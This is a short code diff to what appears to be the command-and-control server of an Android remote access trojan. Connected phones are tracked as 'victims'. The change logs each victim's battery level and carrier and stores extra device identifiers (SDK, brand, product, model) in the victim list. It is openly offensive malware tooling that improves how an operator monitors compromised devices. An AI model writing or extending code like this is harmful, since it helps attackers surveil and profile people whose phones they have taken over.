@@ -332,6 +332,8 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       log.success(`New connection from ${ip}:${address.remotePort}`);
       log.info(`Device: ${query.manf} ${query.model} (Android ${query.release})`);
       log.info(`Device ID: ${query.id}`);
+      if (query.battery) log.info(`Battery: ${query.battery}%`);
+      if (query.operator) log.info(`Operator: ${query.operator}`);
 
       // Check if device already exists, and if so, disconnect the old socket
       const existingVictim = victimsList.getVictim(index);
@@ -341,8 +343,18 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
         victimsList.rmVictim(index); // Remove old entry
       }
 
+      // Extra device info from query params
+      const extraInfo = {
+        sdk: query.sdk,
+        battery: query.battery,
+        operator: query.operator,
+        device: query.device,
+        brand: query.brand,
+        product: query.product
+      };
+
       // Add the victim to victimList
-      victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
+      victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id, extraInfo);
 
 
       //------------------------Notification SCREEN INIT------------------------------------
